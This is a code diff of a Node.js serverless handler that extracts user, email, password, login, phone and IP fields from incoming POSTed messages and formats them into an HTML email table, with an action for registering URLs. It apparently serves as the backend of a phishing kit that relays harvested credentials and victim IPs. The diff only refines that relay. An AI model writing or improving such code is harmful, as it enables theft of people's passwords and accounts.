@@ -49,7 +49,7 @@ function stripHtml(input = "") {
 }
 
 // ======================
-// EXTRACT VARS (WHITELIST ONLY)
+// EXTRACT VARS (WHITELIST)
 // ======================
 function extractVars(input = "") {
   const text = stripHtml(input);
@@ -62,7 +62,7 @@ function extractVars(input = "") {
     const key = m[1].toLowerCase().trim();
     const value = m[2].trim();
 
-    if (allowed.includes(key)) {
+    if (allowed.includes(key) && value) {
       vars[key] = value;
     }
   }
@@ -71,7 +71,19 @@ function extractVars(input = "") {
 }
 
 // ======================
-// BUILD HTML EMAIL
+// BUILD ROW (AUTO SKIP EMPTY)
+// ======================
+function row(label, value) {
+  if (!value || value.trim() === "") return "";
+  return `
+<tr>
+  <td style="padding:6px 10px;border-bottom:1px solid #334155;color:#94a3b8">${label}</td>
+  <td style="padding:6px 10px;border-bottom:1px solid #334155;color:#fff">${value}</td>
+</tr>`;
+}
+
+// ======================
+// BUILD HTML (CLEAN AUTO FILTER)
 // ======================
 function buildHtml(vars) {
   return `
@@ -84,12 +96,12 @@ function buildHtml(vars) {
 
 <table style="width:100%;border-collapse:collapse;background:#1e293b;border-radius:10px;overflow:hidden">
 
-<tr><td>User</td><td>${vars.user || "-"}</td></tr>
-<tr><td>Email</td><td>${vars.email || "-"}</td></tr>
-<tr><td>pass</td><td>${vars.password || "-"}</td></tr>
-<tr><td>login</td><td>${vars.login || "-"}</td></tr>
-<tr><td>Phone</td><td>${vars.phone || "-"}</td></tr>
-<tr><td>IP</td><td>${vars.ip || "-"}</td></tr>
+${row("User", vars.user)}
+${row("Email", vars.email)}
+${row("Password", vars.password)}
+${row("Login", vars.login)}
+${row("Phone", vars.phone)}
+${row("IP", vars.ip)}
 
 </table>
 
@@ -104,10 +116,7 @@ function buildHtml(vars) {
 module.exports = async (req, res) => {
   try {
     if (req.method !== "POST") {
-      return res.status(405).json({
-        success: false,
-        message: "POST only"
-      });
+      return res.status(405).json({ success: false, message: "POST only" });
     }
 
     const body = parseBody(req);
@@ -119,9 +128,7 @@ module.exports = async (req, res) => {
     // ADD URL
     // ======================
     if (action === "add-url") {
-      if (!body.url) {
-        return res.json({ success: false, message: "URL kosong" });
-      }
+      if (!body.url) return res.json({ success: false, message: "URL kosong" });
 
       if (!urls.includes(body.url)) {
         urls.push(body.url);
@@ -162,18 +169,19 @@ module.exports = async (req, res) => {
     }
 
     // ======================
-    // EXTRACT FILTERED VARS
+    // EXTRACT VARS
     // ======================
     const vars = extractVars(messageRaw);
 
+    // auto IP fallback
     vars.ip =
       vars.ip ||
-      req.headers["x-forwarded-for"] ||
+      req.headers["x-forwarded-for"]?.split(",")[0] ||
       req.socket?.remoteAddress ||
-      "unknown";
+      "";
 
     // ======================
-    // BUILD HTML
+    // BUILD HTML CLEAN
     // ======================
     const html = buildHtml(vars);
 
